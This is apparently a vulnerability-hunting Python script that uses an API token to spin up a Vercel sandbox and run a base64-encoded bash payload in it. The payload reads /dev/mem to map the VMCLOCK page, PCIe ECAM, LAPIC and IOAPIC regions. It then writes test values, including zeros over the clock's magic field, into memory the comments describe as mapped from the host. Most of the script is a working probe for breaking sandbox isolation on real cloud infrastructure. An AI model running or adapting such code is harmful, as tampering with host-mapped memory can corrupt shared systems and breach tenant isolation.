# -*- coding: utf-8 -*-
"""v53d: VMCLOCK (AMZNC10C) 深挖 — 全 4KB 扫描 / 时钟变化 / 写测试 / ECAM-LAPIC-IOAPIC
0xde000 magic VCLK 已确认 host 真实映射"""
import base64, json, sys, time, urllib.request, urllib.error
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TOKEN, TEAM, PROJ

def api_raw(method, path, body=None, timeout=180, maxlen=400000):
    req = urllib.request.Request('https://api.vercel.com' + path, method=method)
    req.add_header('Authorization', 'Bearer ' + TOKEN)
    req.add_header('Content-Type', 'application/json')
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode(errors='replace')[:maxlen]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')[:maxlen]
    except Exception as e:
        return -1, 'EXC %s' % str(e)[:120]

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

if __name__ == '__main__':
    api_raw('DELETE', '/v2/sandboxes/clk53?teamId=%s&projectId=%s' % (TEAM, PROJ))
    time.sleep(2)
    c, r = api_raw('POST', '/v4/sandboxes?teamId=%s' % TEAM, {"projectId": PROJ, "name": 'clk53'})
    if c != 200:
        print('create failed', r[:200], flush=True)
        sys.exit(1)
    sid = json.loads(r)['sandbox']['currentSessionId']
    print('sid =', sid, flush=True)
    time.sleep(8)

    probe = r'''
python3 - <<'EOF'
import os, time
def rd(addr,n=16):
    try:
        f=os.open('/dev/mem',os.O_RDONLY); os.lseek(f,addr,0)
        d=os.read(f,n); os.close(f); return d
    except Exception as e:
        return None
def wr(addr,d):
    try:
        f=os.open('/dev/mem',os.O_RDWR); os.lseek(f,addr,0)
        os.write(f,d); os.close(f); return True
    except Exception as e:
        return False
print('===== 1. VMCLOCK 全 4KB 扫描 (64B 步长非零区) =====')
base=0xde000
for off in range(0,0x1000,64):
    d=rd(base+off,64)
    if d is None: print('0x%x ERR'%(base+off)); break
    nz=sum(1 for b in d if b!=0)
    if nz: print('0x%x: %d non-zero bytes -> %s' % (base+off, nz, d.hex(' ')))
print('===== 2. 时钟变化观察 (t0 vs t1, 间隔 2s) =====')
a=rd(base,64); time.sleep(2); b=rd(base,64)
for i in range(0,64,4):
    va=int.from_bytes(a[i:i+4],'little'); vb=int.from_bytes(b[i:i+4],'little')
    mark=' <== CHANGED' if va!=vb else ''
    print('off %02x: %08x -> %08x%s' % (i,va,vb,mark))
print('===== 3. 写测试 (写前读/写后读) =====')
# 3a: 写 0xdeadbeef 到 offset 0x10 (非 magic 区)
print('-- 3a write 0xdeadbeef @ +0x10')
print('  before:', rd(base+0x10,4).hex(' '))
print('  wr rc:', wr(base+0x10, b'\xef\xbe\xad\xde'))
print('  after :', rd(base+0x10,4).hex(' '))
# 3b: 写 0 到 magic 区 offset 0 (危险但可回滚)
print('-- 3b write 0x00000000 @ +0x00 (magic)')
print('  before:', rd(base+0,4).hex(' '))
print('  wr rc:', wr(base+0, b'\x00\x00\x00\x00'))
print('  after :', rd(base+0,4).hex(' '))
# 3c: 写 0xffffffff 到 +0x08
print('-- 3c write 0xffffffff @ +0x08')
print('  before:', rd(base+8,4).hex(' '))
print('  wr rc:', wr(base+8, b'\xff\xff\xff\xff'))
print('  after :', rd(base+8,4).hex(' '))
# 3d: 再观察时钟是否继续走
a=rd(base,64); time.sleep(1); b=rd(base,64)
print('-- post-write 时钟 t0:', a[0:16].hex(' '))
print('-- post-write 时钟 t1:', b[0:16].hex(' '))
print('===== 4. ECAM 0xeec00000 (MCFG 声明的 PCIe 配置空间) =====')
for addr in [0xeec00000, 0xeec01000, 0xeec10000, 0xeecf0000]:
    d=rd(addr,16)
    print('0x%x: %s' % (addr, d.hex(' ') if d else 'ERR'))
print('===== 5. LAPIC 0xfee00000 / IOAPIC 0xfec00000 =====')
d=rd(0xfee00000,16); print('LAPIC: %s' % (d.hex(' ') if d else 'ERR'))
d=rd(0xfec00000,16); print('IOAPIC: %s' % (d.hex(' ') if d else 'ERR'))
print('===== 6. 0xfebfffff 边界 / 保留区扫描 =====')
for addr in [0xeec00000-16, 0xfebfffff-16, 0xfebff000, 0xfec00000-16, 0xfee00000-16, 0x100000000-16]:
    d=rd(addr,16)
    print('0x%x: %s' % (addr, d.hex(' ') if d else 'ERR'))
print('===== 7. VMCLOCK 再读 0xde000 完整 64B =====')
print(rd(base,64).hex(' '))
EOF
'''
    b64 = base64.b64encode(probe.encode()).decode()
    c2, r2 = api_raw('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM),
                     {"command": "bash", "args": ["-c", 'echo %s | base64 -d | bash' % b64],
                      "wait": True, "logs": True, "timeout": 60000}, timeout=150)
    print('[clk] -> %d' % c2, flush=True)
    print(parse_data(r2), flush=True)
    api_raw('DELETE', '/v2/sandboxes/clk53?teamId=%s&projectId=%s' % (TEAM, PROJ))
    print('DONE', flush=True)
